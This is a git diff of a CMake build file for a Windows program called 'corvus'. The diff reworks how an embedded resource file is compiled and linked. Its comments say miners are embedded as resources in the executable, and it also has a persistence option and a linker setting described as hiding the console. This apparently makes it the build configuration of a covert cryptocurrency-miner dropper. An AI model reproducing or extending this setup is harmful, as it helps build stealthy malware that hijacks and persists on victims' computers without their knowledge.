@@ -31,6 +31,11 @@ set(SRC_FILES
     src/config_manager.cpp
 )
 
+# Resource files
+set(RESOURCE_FILES
+    resources/embedded_resource.rc
+)
+
 # Header files
 set(HEADER_FILES
     include/util.h
@@ -43,8 +48,6 @@ set(HEADER_FILES
     include/json_printer.h
     include/json.hpp
     include/process_info.h
-    include/resources.h
-    include/embedded_resource.h
     include/config_manager.h
 )
 
@@ -64,53 +67,24 @@ if(ENABLE_PERSISTENCE)
     list(APPEND HEADER_FILES include/persistence.h)
 endif()
 
-# Resource files
-set(RC_FILE resources/embedded_resource.rc)
-set(RC_FILE_ABS ${CMAKE_CURRENT_SOURCE_DIR}/${RC_FILE})
-set(RC_OBJ ${CMAKE_CURRENT_BINARY_DIR}/embedded_resource.o)
-
+# Miners are now embedded as resources in the executable
 set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
+if(MSVC)
+    # Enable resource compilation for MSVC
+    enable_language(RC)
+endif()
 if(NOT MSVC)
 	set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
 endif()
 set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")
 
-# Handle resource compilation based on compiler
-if(MSVC)
-	# For MSVC, add the RC file directly - it will be compiled by the resource compiler
-	set(RESOURCE_FILES ${RC_FILE_ABS})
-	enable_language(RC)
-	set(CMAKE_RC_COMPILE_OBJECT "<CMAKE_RC_COMPILER> <DEFINES> <INCLUDES> <FLAGS> /fo <OBJECT> <SOURCE>")
-else()
-	# For MinGW cross-compilation, use windres
-	add_custom_command(
-	    OUTPUT ${RC_OBJ}
-	    COMMAND x86_64-w64-mingw32-windres 
-	            -I${CMAKE_CURRENT_SOURCE_DIR}/include 
-	            -I${CMAKE_CURRENT_SOURCE_DIR}/resources
-	            -o ${RC_OBJ}
-	            ${RC_FILE_ABS}
-	    DEPENDS ${RC_FILE_ABS} ${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded.exe
-	    COMMENT "Compiling resources..."
-	)
-	set(RESOURCE_FILES ${RC_OBJ})
-endif()
-
 # Create executable
 add_executable(corvus 
     #WIN32 
-    ${SRC_FILES} 
+    ${SRC_FILES}
+    ${RESOURCE_FILES}
     ${HEADER_FILES}
 )
-
-# For MSVC, explicitly link the resource file as an object/source
-if(MSVC)
-	set_source_files_properties(${RC_FILE_ABS} PROPERTIES LANGUAGE RC)
-	target_sources(corvus PRIVATE ${RC_FILE_ABS})
-else()
-	# For MinGW, add the compiled object file
-	target_sources(corvus PRIVATE ${RC_OBJ})
-endif()
 
 # Set linker flags for GUI subsystem (hide console)
 set_target_properties(corvus PROPERTIES
